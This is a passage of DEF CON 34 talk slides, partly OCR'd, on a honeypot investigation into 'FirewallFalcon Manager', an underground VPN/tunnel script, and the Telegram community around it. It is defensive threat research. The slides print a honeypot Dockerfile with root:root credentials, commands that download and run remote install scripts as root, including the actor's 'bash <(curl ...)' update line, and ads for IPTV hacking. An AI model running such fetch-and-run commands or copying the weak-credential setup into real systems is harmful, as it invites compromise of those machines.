---
title: "Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure"
speakers: ["Assaf Morag"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Assaf Morag - Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure - v2.pdf"
pages: 144
sha256: "22521e71cd216569b3b7b7adbc995a83837c3636dd082c853f70d5759bca6665"
text_chars: 60940
ocr_pages: 105
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:14:42Z"
---
# Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure

**Speakers:** Assaf Morag  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Assaf Morag - Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure - v2.pdf` (144 pages)


## Slide 1

**Hacking the Hackers Who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure Assaf Morag**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Hacking the Hackers
Who Hack Hackers
Supply-Chain Backdoors in Underground
VPN Infrastructure
Assaf Morag
+ flare
```

## Slide 2

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
= “aye FirewallFalcon
Journey ;
```

## Slide 3

**HONEYPOTS**

## Slide 4

**HONEYPOTS**

## Slide 5

**HONEYPOTS RUNNING ON CONTAINERS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
HONEYPOTS RUNNING ON CONTAINERS
+ flare
```

## Slide 6

**HONEYPOTS RUNNING ON CONTAINERS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
HONEYPOTS RUNNING ON CONTAINERS
ubuntu@FlareResearch:~/Honeypots/SSH$ cat Dockerfile
FROM ubuntu:24.04
USER root
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && \
apt-get install -y openssh-server sudo && \
rm -rf /var/lib/apt/lists/x
mkdir -p /var/run/sshd
echo “root:root" | chpasswd
for user in sock proxy vpn sshuser; do \
useradd -m -s /bin/bash "$user"; \
echo "$user:$user" | chpasswd; \
done
echo "%sudo ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
sed -i 's/*#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
sed -i 's/*#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config
EXPOSE 22
CMD ["/usr/sbin/ssh
ubuntu@FlareResearch:~/Honeypots/SSH$ |
+ flare
```

## Slide 7

**HONEYPOTS RUNNING ON CONTAINERS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
HONEYPOTS RUNNING ON CONTAINERS
RUN echo "root:root" | chpasswd
```

## Slide 8

**SSH HONEYPOT**

## Slide 9

**IN ONE OF THESE ATTACKS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IN ONE OF THESE ATTACKS
ubuntu@FlareResearch:~/Honeypots/SSH$ cat attack_dump_3
{
"@timestamp": "2026-01-25T12:42:18.481Z"
"attack_number": 379,
"event_type": "SSH_Honeypot",
Mhostsnt
"hostname": "XX.XX.XX.XX"
}
Mii staofahiles* sa
{
"name": "“menu.sh",
"origin": "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/menu.sh",
"sha256": "6cflb4c3b2b0f7d7e9b8ded8Ff65c6b2cxxxxxXXXXXXXXXXXXXXXXXXXXXXK",
"downloaded": true
"name": "install_mod",
"origin "https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh",
"Sha256": "dbd52a18d2c9c16b4abfxxxxxxxXxXXXXXXXXXXXXXXXXXXKXXXXXXK",
"downloaded": true
"name" install.sh",
"origi "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/install.sh"
"repository": "FirewallFalcon-—Manager"
"downloaded": true
1,
"network": {
"protocol "HTTPS"
"user_age curl/8.5.0"
y
}
ubuntu@FlareResearch: ~/Honeypots/SSH$ 0
```

## Slide 10

**IN ONE OF THESE ATTACKS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IN ONE OF THESE ATTACKS
IMeEMaTs Tsimeteail. sin",
"origin": "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/install.sh",
"repository": "FirewallFalcon-Manager",
"downloaded": true
```

## Slide 11

**CROWDSTRICK’S FIREWALL FALCON MANAGER**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CROWDSTRICK’S FIREWALL FALCON MANAGER
+ flare
```

## Slide 12

**DOWNLOADED FROM GITHUB**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DOWNLOADED FROM GITHUB
"name": We = =
"Origin"# "https://raw.githubusercontent.com/firewallfalcons/f#FirewallFalcon—Manager/ma
"reposito
"downloaded": true
```

## Slide 13

### **THE GITHUB REPOSITORY**

Deleted in May 2026 New and modified tool available now on: https://codeberg.org/firewallfalcons

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
THE GITHUB REPOSITORY
“f FirewallFalcon Manager
FirewallFalcon Manager — A powerful and unified proxy/VPN management script for Linux servers. It supports
multiple tunneling protocols, user management, SSL automation, and an Nginx gateway that handles all traffic
efficiently.
Quick Installation
Run the following command to install the latest version:
curl -L -o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager Oo
te fl d re Deleted in May 2026
New and modified tool available now on: https://codeberg.org/firewallfalcons
```

## Slide 14

POWERFUL?

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 15

POWERFUL?

UNIFIED?

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 16

POWERFUL?

UNIFIED?

PROXY?

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 17

POWERFUL?

UNIFIED?

PROXY?

VPN?

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 18

POWERFUL?

UNIFIED?

MANAGEMENT

PROXY?

VPN?

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 19

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

## Slide 20

**A LEAD TO A TELEGRAM GROUP**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A LEAD TO A TELEGRAM GROUP
“-, Community & Support
e Telegram Channel: t.me/firewallfalcons - Join for updates and support!
FIREWALL
FALCONS
+ flare
```

## Slide 21

**DISCOVERY: FINDING LEADS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
4 SHODAN Explore Downloads Pricing @ "t.me/firewallfalcons" Account
TOTAL RESULTS
anetencenecencenncenenenceeeenenencsens tt View Report &4 Download Results lu Historical Trend ( View on Map Q Advanced Search
204 Product Spotlight: Free, Fast IP Lookups for Open Ports and Vulnerabilities using InternetDB
81.208.191.4 (7 2026-07-15T06:17:31.748990
Oracle Svenska AB HIIP/1.1 101 t.me/firewallfalcons
® saudi Arabia, Jeddah Server: nginx
Date: Wed, 15 Jul 2026 06:17:31 GMT
Connection: upgrade
38.248.6.105 [7 2026-07-15T05:22:42.191678
: Cogent Communications HTTP/1.1 101 t.me/firewallfalcons
Germany 64 © United States, Newark Server: nginx
G6 Date: Wed, 15 Jul 2026 05:22:47 GMT
United States 48 Connection: upgrade
Singapore 19
United Kingdom 14 38.248.6.103 G 2026-07-15T05:11:42.228347
Cogent Communications HTTP/1.1 101 t.me/firewallfalcons
France 12 © United States, Newark TON CEN CENT Cl eS
More...
38.248.6.95 (7 2026-07-15102:37:49.531589
FOP PORTS ee Cogent Communications & SSL Certificate HTTP/1.1 101 t.me/firewallfalcons
80 97 © united States, Newark Issued By: 5 TTX
| Common Name: Date: Wed, 15 Jul 2026 02:37:49 GMT
8080 56 38.248.6.95 Content-Length: @
Connection: upgrade
443 45 Issued To:
|- Common Name:
8888 2 38.248.6.95
Supported SSL Versions:
81 1
TLSv1.2, TLSv1.3
More...
```

## Slide 22

### **DISCOVERING THE TELEGRAM GROUPS**

|**Type**|Broadcast channel|**Type**|Chat group|
|---|---|---|---|
|**Members**|3,843|**Members**|982|
|**Messages**|329|**Messages**|1,661|
|**Active window**|23 Nov 2024–10 Jul 2026|**Active window**|18 Nov 2025–13 Jul 2026|

## Slide 23

### **DISCOVERING THE TELEGRAM GROUPS**

#### Activity timeline of the Telegram broadcast channel

#### Activity timeline of the Telegram chat group

## Slide 24

**TELEGRAM LANGUAGE DISTRIBUTION**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
TELEGRAM LANGUAGE DISTRIBUTION
| LANGUAGE DISTRIBUTION
LANGUAGE
/ 27,92%
© Latin/English 72.08%
72,08% Arabic 27,92%
——
+flare
```

## Slide 25

**TELEGRAM MENTIOND COUNTRIES DISTRIBUTION**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
TELEGRAM MENTIOND COUNTRIES DISTRIBUTION
COUNTRY DISTRIBUTION
COUNTRY
©) Morocco
Big UK
fm Egypt
© Ghana
8 India
lraq
(Sm Sudan
OB ireland
fem Jordan
GIS Kenya
& Brazil
(®) Saudi
(9 Algeria
= Syria
(®) Saudi Arabia
(6) Tunisia
G™ Chile
(] Germany
OB Nigeria
```

## Slide 26

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
FirewallFalcon ]
’) OstoraPremium App Source Code FOR SALE ¢§
¥ “4 Contact: @FirewallFalcon
ee 8 ee ae ro aE ToS ~ +
ale
(
= OstoraOrg Q
Ostora TV a —
Watch Live TV Sports Channel and ive spon =
HD Movies Free
sia) Fast Free Secure
DOWNLOAD OSTORA TV APK
Security Verified
GD cmsecurity G Lookout [YJ McAfee
a YON
Download Ostora TV APK to watch live TV, sports, and movies in HD.
Enjoy ad-free streaming, offline videos and multiple languages easily.
+ flare ———.
```

## Slide 27

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
+ flare
FirewallFalcon
Private service: Hacking any IPTV.
Create your own IPTV.
Hack any live football match websites.
```

## Slide 28

**1**

### **MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

**2**

**3**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
1] i) Hetzner Server Auction
Discounted dedicated servers with full root access.
® Prices drop over time + %& Refurbished hardware + i?) EU
datacenters
Perfect for budget projects, labs, and long-term servers.
=) & https://www.hetzner.com/sb/
~
» Hetzner
Refurbished server for sale in Hetzner Server Auction
Be quick and save money: Top and cheap refurbished dedicated
servers at Hetzner Server Auction
ya
a
a)
FirewallFalcon
3 SCAM ALERT - WARNING T...
I bought a VPS, but it's not working.
é .
27 @.;
3 © 3881 # 4:53PM
+ flare
Deleted Account
9
I bought a VPS, but it's not working.
He scammed you, you dummy. ‘3
```

## Slide 29

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
ae
FirewallFalcon
9 Nant a full tutorial on TCP Bypass Proxy?
‘| Learn how to bypass restrictions like a pro!
& Like & drop a comment if you're interested —
T'll post the full guide once we hit enough interest! ~~
& G30 81 Bs W2
@BD 19 comments
A a 6 ae
© 35
FirewallFalcon
FirewallFalcon
9 Want a full tutorial on TCP Bypass Proxy? \ | Learn...
__ If You have a clean Vps Contact me to do the tutorial on it
| Ubuntu 20.04.6 LTS is recommended
| x86-64 architecture
‘|
@firewallfalcon
| & &7 Gi
© Leave a comment
June 4, 2025
+ flare
Mea) |
FirewallFalcon
Want a full tutorial on TCP Bypass Proxy?
~ Learn how to bypass restrictions like a pro!
% Like & drop a comment if you're interested —
I'll post the full guide once we hit enough interest! y=
& G30 Al 84 W2 ©
GBD 19 comments
FirewallFalcon
9 Want a full tutorial on TCP Bypass Proxy? Lal Learn...
If You have a clean Vps Contact me to do the tutorial on it
wi
Ubuntu 20.04.6 LTS is recommended
x86-64 architecture
@firewallfalcon
a & 7 v 1 © 3346 edited 3:45PM
```

## Slide 30

### **MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS
Rememene)
+ flare >
```

## Slide 31

**TELEGRAM CONTENT ANALYSIS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
_
CONTENT TYPE MSGS % OF 329
G FirewallFalcon related 1 57
FIREWALL (infrastructure / artifacts / URLs / ee eee | F 48.0%
FALCON configs / logs / panels / etc.) (48%)
Tunnel / VPN /
aoe oe 267.0%
@)) Carrier-name oe
A targeting 14 4.3%
ax ,
Hacking / 9
("e)) recon tooling a 11 26a %o
Payment / ny
ES monetization at 6 1.8%
be Cracked / 0
© pirated releases ie: 3 0.9%
Other content Oe a a a gr “fy ‘
(ay (not shown) a uN rN Pear eR Er al 221 67.2%
| 4 |
0 10 20 30 40 50
NUMBER OF MESSAGES
| FIREWALLFALCON RELATED CONTENT: 157 MESSAGES (48% OF TOTAL 329)
4
```

## Slide 32

**TELEGRAM CONTENT ANALYSIS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
,
<
|
~eeeu
Sutwews
Pai
CONTENT TYPE MSGS : %OF 1,661 )
|
FirewallFalcon related |
Geen Ss 165 loo, | |
sere configs / logs / panels / etc.) (10.00%)
Zea ; ; ; i
Tunnel / VPN / 9 Y
ron el ok |
:
=O (ote st |
=@) config | . 2 59 3.55%
OO) ae ee == te 2.089
EN _) targeting | | : 34 | 2.05%
Cracked / | : : : :
H 9,
lls peat —= 14 084%
= | }
L H } H |
ay Hacking / 5
Yep) recon a : 10 : 0.60% |
a) ents > | | | : 8 0.48%
=© monetization 0 10 20 30 40 e0 70
NUMBER OF MESSAGES .
2 a MESSAGES IN DISPLAYED CATEGORIES OTHER CONTENT — \
oP 186 (11.20%) 1,475 (88.80%) —— J
L G FIREWALLFALCON RELATED CONTENT: 165 MESSAGES (10.90% OF TOTAL 1,661) )
```

## Slide 33

### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
FirewallFalcon
f % FirewallFalcon Manager — COMING SOON! ¢*)
Ultimate SSH Manager for ARM & x64 devices Mill
“X Now’s your chance to help shape it!
Do YOU want any specific features?
Any modifications you'd like to see?
| @ under Development “ &%
bu |.
SBD vocommens
>flare
```

## Slide 34

### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
FirewallFalcon Manager v1.0
SYSTEM RESOURCES
FirewallFalcon Manager v
|
i
SYSTEM RESOURCES
USER MANAGEMENT
Create New User 5) Unlock User Account
Delete User List ALl Managed Users
Edit User Details Renew User Account
Lock User Account
PROTOCOL MANAGEMENT
Install badvpn (UDP 7300) (A
Uninstall badvpn
Install SSL Tunnel (Port 443)
}) Uninstall SSL Tunnel
SYSTEM UTILITIES Install WebSocket Proxy (80, 8080)
Uninstall WebSocket Proxy
Protocol Management Cleanup Expired Users
Return to Main Menu
DANGER ZONE Select an option: Jf
19) Uninstall FirewallFalcon
Select an option: Jj
```

## Slide 35

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
June 19, 2025
4 | FirewallFalcon
r Photo
| @ New Feature Suggestion!
Would you like us to add a Cloudflare Domain Option (} to the
script? © 2707 4:42 PM
»D 9 comments
+ flare
```

## Slide 36

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT &)
As is “aa a are: ey
FirewallFalcon
( 3% Should I Create a New UDP Protocol for You? 2< i
I've been thinking...
What if we had our own custom UDP protocol — built from scratch,
optimized for speed, stealth, and bypassing ISP restrictions? =» Be
vv Also — does UDP work on your network for free?
W11 Gs ns
/
aD 9 comments
+ flare
```

## Slide 37

### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
a 7 Ae
_ FirewallFalcon
_ & Testing a New SSL Tunnel
¢
\ g SSH over HAProxy SSL is now being tested!
°
«> This method could help bypass fingerprinting by firewalls and
improve stealth.
If you're interested in trying it out or want more details, drop a
reaction below! <}
&@ W222 A212
a) 4 comments
+ flare
```

## Slide 38

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
+ flare
FirewallFaicon
| FirewallFalcon
Photo
of New Feature Poll
Yes
No
y gy 2
© Leave a comment
* —
_ Should we add v2ray DNSTT support to the script?
©
4
0
```

## Slide 39

### **ANALYZING THE FIREWALL FALCON RELATED CONTENT**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING THE FIREWALL FALCON RELATED CONTENT
2 ) (<5 8 5
Sle eee, November 18,2025 |
Oh ASRS
 FirewallFalcon
 FirewallFalcon Manager Update Coming Soon
5
|
__ Anew update is on the way with enhanced SSH user
management.
If a user exceeds their usage limits, they will be disconnected from
all devices and locked for 120 seconds before regaining access.
© 2668
| FirewallFalcon channel
) MAJOR UPDATE AVAILABLE FOR FirewallFalcon Manager
}, CRITICAL STEPS — READ CAREFULLY:
UNINSTALL the old script entirely. Bb
BACKUP your users first! Do not forget this. P*4
INSTALL the new version below: =»
bash <(curl -fsSL https://thefirewoods.org)
+ flare # _—_—
```

## Slide 40

**LET’S RECAP…**

## Slide 41

## Slide 42

**CRUSH COURSE ON VPN**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CRUSH COURSE ON VPN
= =G) Encrypted tunnel.
Client ss
VPN Server
; | )) et f Internet
+ flare
```

## Slide 43

**WHY USE A VPN?**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WHY USE A VPN?
PRIVACY
+flare
```

## Slide 44

### **WHAT DOES FIREWALL FALCON OFFER?**

**The Core Concept: One HTTPS Entry Point, Many Hidden Services** At a high level, these stacks are built around three layers:

- <u>Entry Layer: Web Infrastructure (Usually Nginx) that acts as the public-</u> facing HTTPS server and traffic router.

- <u>Transport Layer: Tunnel Frameworks (V2Ray, XRay, WebSocket tunnels,</u> DNS tunnels) encapsulate traffic inside allowed protocols.

- <u>Service Layer: Actual Functionality, which include VPN connections, SSH</u> sessions, proxy relays, or arbitrary TCP tunnels.

## Slide 45

**WHAT DOES FIREWALL FALCON OFFER?**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WHAT DOES FIREWALL FALCON OFFER?
—
fr \
—<. — .O!S~C~C«~N
il = HTTPS > =} ~---2>\ (Unknown
[ AN 2 fo internal
| Clier P — = iq routing)
jen gf
Web Server —
ail —
—>| : -<---> =>
ZS
Client Obfuscated Tunnelcore Routing rules Outbound
transport
+ flare
```

## Slide 46

**LET’S INSTALL (AS A CONTAINER)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S INSTALL (AS A CONTAINER)
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ sudo docker build -t tests/firewallfalcon .
[+] Building 19. a8 (9/9) PASS docker:default
r from Dockerfile Q.0s
Q@.0s
rary/ubuntu:
. 70kB
update && apt-—ge
./FirewallFalcon
c445b7caba8
8@aac
> => unpacking to docker sts/firewallfalcon:
aianitucriarensscarcn: 2 /Research/February-26/eirewallpalcons sudo docker run -dit tests/firewallfalcon
df928c69dc21801c508999 F8bdc5ca237b2dc56c74fb1be7a0646b48438Fd618
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ sudo docker ps -a
CONTAINER ID IMAGE COMMAND CREATED STATUS NAMES
df928c69dc21 tests/firewallfalcon "sh ./FirewallFalcon.." 3 seconds ago Exited (8) 2 seconds ago bold_kilby
2d53844b97f1  £259b650c524 "sh ./FirewallFalcon.." 2 minutes ago Exited (127) 2 minutes ago goofy_diffie
```

## Slide 47

### **LET’S INSTALL (FROM INSIDE A CONTAINER)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S INSTALL (FROM INSIDE A CONTAINER)
‘root@ac41f4243a45: /FirewallFalcon—Manager# ./install.sh
Installing FirewallFalcon Manager...
dele aC hh PMR Ve se meCUr] —L —o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager
/main/install.sh" && chmod +x install.sh && sudo ./install.sh && rm install.sh
+ flare
```

## Slide 48

**LET’S INSTALL (NON-ROOT)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S INSTALL (NON-ROOT)
ubuntu@FlareResearch:~/Containers/FirewallFalcon-Manager$ ./install.sh
Error: This script must be run as root.
+ flare
```

## Slide 49

**LET’S INSTALL (ON A NEW VM-LAB)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S INSTALL (ON A NEW VM-LAB)
root@ip-—172-31-32-128:~# curl -L -o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager
/main/install.sh" && chmod +x install.sh && sudo ./install.sh && rm install.sh
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
10@ 2124 100 2124 () @ 13355 Q@ --t--8-— ti 3-3 -— 13443
sudo: unable to resolve host ip-172-31-32-128: Name or service not known
Installing FirewallFalcon Manager...
Applying FirewallFalcon SSH configuration...
SSH configuration validated.
SSH service restarted.
Initializing FirewallFalcon Manager setup...
a
Configuring user limiter service...
@ Setup finished.
Installation complete!
Type 'menu' to start.
root@ip-172-31-32-128:~# [J
+ flare
```

## Slide 50

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
+ flare
@ Select
Ubuntu 24.04.3 LTS
22.60% Used
@ Managed Accounts
Create New User
Delete User
Renew User Account
Lock User Account
Protocol Manager
DT Proxy Manager
53
CloudFlare Free Domain
SSH Banner Config
Auto-Reboot Task
é
Uninstall Script
an option: |
| Uptime: 6 hours, 41 minutes
| Online Sessions: @
| Sys Load (1m): 0.03
Unlock User Account
Edit User Details
List Managed Users
Generate Client Config
Traffic Monitor (Lite)
Block Torrent (Anti-P2P)
Backup User Data
Restore User Data
Cleanup Expired Users
Q@] Exit
```

## Slide 51

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 42 minutes
Memory 22.70% Used | Online Sessions: @
Users 1 Managed Accounts | Sys Load (1m): @.02
@M User 'test_user' created successfully!
® Username: test_user
Password: 123456
Expires on: 2026-02-12
Gf Connection Limit:
Do you want to generate a client connection config for this user? (y/n): ff
+ flare
```

## Slide 52

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
@ Do you want to generate a client connection config for this user? (y/n): y
Copy the details below to your clipboard:
® User Details
e Username: test_user
e Password: 123456
SSH Direct:
e Host:
e Port: 22
e payload: (Standard SSH)
Press [Enter] to return to the menu...
```

## Slide 53

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
+ flare
@ Select
Ubuntu 24.04.3 LTS
22.60% Used
@ Managed Accounts
Create New User
Delete User
Renew User Account
Lock User Account
Protocol Manager
DT Proxy Manager
53
CloudFlare Free Domain
SSH Banner Config
Auto-Reboot Task
é
Uninstall Script
an option: |
| Uptime: 6 hours, 41 minutes
| Online Sessions: @
| Sys Load (1m): 0.03
Unlock User Account
Edit User Details
List Managed Users
Generate Client Config
Traffic Monitor (Lite)
Block Torrent (Anti-P2P)
Backup User Data
Restore User Data
Cleanup Expired Users
Q@] Exit
```

## Slide 54

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
Memory 22.59% Used | Online Sessions: @
Users 1 Managed Accounts | Sys Load (1m): 0.00
---— TUNNELLING PROTOCOLS---
1] # Install badvpn (UDP 7300) (Inactive)
2] — Uninstall badvpn
3] # Install udp-custom (Inactive)
4] — Uninstall udp-custom
5] @ Install SSL Tunnel (Port 444) (Inactive)
6] — Uninstall SSL Tunnel
7] %& Install/View DNSTT (Port 53) (Inactive)
8] Uninstall DNSTT
[ 9] +. Install Falcon Proxy (Select Version) (Inactive)
[10] — Uninstall Falcon Proxy
[11] @ Install/Manage Nginx Proxy (80/443) (Inactive)
[16] @Install ZiVPN (UDP 5667) (Inactive)
[17] — Uninstall ZiVPN
waa MANAGEMENT PANELS -——-—
[12] gs Install X-UI Panel (Not Installed)
[13] = Uninstall X-UI Panel
[ @] Return to Main Menu
@ Select an option: J
>flare
```

## Slide 55

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
Memory 22.59% Used | Online Sessions: @
Users 1 Managed Accounts | Sys Load (1m): 0.00
---— TUNNELLING PROTOCOLS---
1] # Install badvpn (UDP 7300) (Inactive)
2] — Uninstall badvpn
3] # Install udp-custom (Inactive)
4] — Uninstall udp-custom
5] @ Install SSL Tunnel (Port 444) (Inactive)
6] — Uninstall SSL Tunnel
7] %& Install/View DNSTT (Port 53) (Inactive)
8] Uninstall DNSTT
[ 9] +. Install Falcon Proxy (Select Version) (Inactive)
[10] — Uninstall Falcon Proxy
[11] @ Install/Manage Nginx Proxy (80/443) (Inactive)
[16] @Install ZiVPN (UDP 5667) (Inactive)
[17] — Uninstall ZiVPN
wa MANAGEMENT PANELS ---
[12] gs Install X-UI Panel (Not Installed)
[13] = Uninstall X-UI Panel
[ @] Return to Main Menu
@ Select an option: J
>flare
```

## Slide 56

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
® Checking if port 444 is available...
M Port 444 is free to use.
@BNo active firewall (UFW or firewalld) detected. Assuming ports are open.
@Y Generating self-signed SSL certificate...
M Certificate created: /etc/firewallfalcon/ssl/firewallfalcon.pem
H Creating HAProxy configuration for port 444...
®BReloading and starting HAProxy service...
@ SUCCESS: SSL Tunnel is active.
Clients can now connect to this server's IP on port 444 using an SSL/TLS tunnel.
Press [Enter] to return to the menu...
```

## Slide 57

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
Memory 22.59% Used | Online Sessions: @
Users 1 Managed Accounts | Sys Load (1m): 0.00
---— TUNNELLING PROTOCOLS---
1] # Install badvpn (UDP 7300) (Inactive)
2] — Uninstall badvpn
3] # Install udp-custom (Inactive)
4] — Uninstall udp-custom
5] @ Install SSL Tunnel (Port 444) (Inactive)
6] — Uninstall SSL Tunnel
7] %& Install/View DNSTT (Port 53) (Inactive)
8] Uninstall DNSTT
[ 9] +. Install Falcon Proxy (Select Version) (Inactive)
[10] — Uninstall Falcon Proxy
[11] @ Install/Manage Nginx Proxy (80/443) (Inactive)
[16] @Install ZiVPN (UDP 5667) (Inactive)
[17] — Uninstall ZiVPN
wa MANAGEMENT PANELS ---
[12] gs Install X-UI Panel (Not Installed)
[13] = Uninstall X-UI Panel
[ @] Return to Main Menu
@ Select an option: J
>flare
```

## Slide 58

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
Ubuntu 24.04.3 LTS | Uptime: 6 hours, 5@ minutes
23.86% Used | Online Sessions: @
1 Managed Accounts | Sys Load (1m): @.02
™
% Forcing release of Port 53 (stopping systemd-resolved)...
® Checking if port 53 (UDP) is available...
M Port 53 (UDP) is free to use.
GBNo active firewall (UFW or firewalld) detected. Assuming ports are open.
Please choose where DNSTT should forward traffic:
[ 1] ™®Forward to local SSH service (port 22)
[ 2] ®Forward to local V2Ray backend (port 8787)
@ Enter your choice [2]: J
```

## Slide 59

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
Your connection details:
— Tunnel Domain: tun- .manager.firewallfalcon.qzz.io
— Public Key:
— Forwarding To: V2Ray (port 8787)
— Action Required: Ensure a V2Ray service (vless/vmess/trojan) listens on port 8787 (no TLS)
+ flare
```

## Slide 60

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
os Ubuntu 24.04.3 LTS | Uptime: 6 hours, 43 minutes
Memory 22.59% Used | Online Sessions: @
Users 1 Managed Accounts | Sys Load (1m): 0.00
---— TUNNELLING PROTOCOLS---
1] # Install badvpn (UDP 7300) (Inactive)
2] — Uninstall badvpn
3] # Install udp-custom (Inactive)
4] — Uninstall udp-custom
5] @ Install SSL Tunnel (Port 444) (Inactive)
6] — Uninstall SSL Tunnel
7] %& Install/View DNSTT (Port 53) (Inactive)
8] Uninstall DNSTT
[ 9] +. Install Falcon Proxy (Select Version) (Inactive)
